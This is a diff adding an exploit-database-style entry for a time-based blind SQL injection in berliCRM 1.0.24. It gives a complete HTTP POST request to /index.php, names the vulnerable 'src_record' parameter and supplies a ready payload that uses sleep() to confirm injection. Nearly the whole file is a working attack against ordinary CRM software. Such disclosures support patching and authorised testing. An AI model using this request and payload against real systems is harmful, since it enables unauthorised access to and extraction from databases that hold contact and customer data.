@@ -1,0 +1,35 @@
+# Exploit Title: berliCRM 1.0.24 - 'src_record' SQL Injection
+# Google Dork: N/A
+# Date: 2020-10-11
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.berlicrm.de
+# Software Link: https://github.com/berliCRM/berlicrm/archive/1.0.24.zip
+# Version: 1.0.24
+# Tested on: Kali Linux
+# CVE : N/A
+
+
+========== Post Request =========================
+
+POST /index.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: localhost
+Cookie: PHPSESSID=bab89b6fc39e1fd2c26877a4544cbb64
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip,deflate
+Content-Length: 226
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+Connection: Keep-alive
+
+__vtrftk=sid:ff114f440469f69f1507ebd04c65e05ba2fcc8d3%2C1602392658&module=Contacts&src_field=contact_id&src_module=Contacts&src_record=1&triggerEventName=postSelection721&view=Popup
+
+============= Vulnerable Parameter ===============
+
+src_record (POST)
+
+============= Payload  ===========================
+
+0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
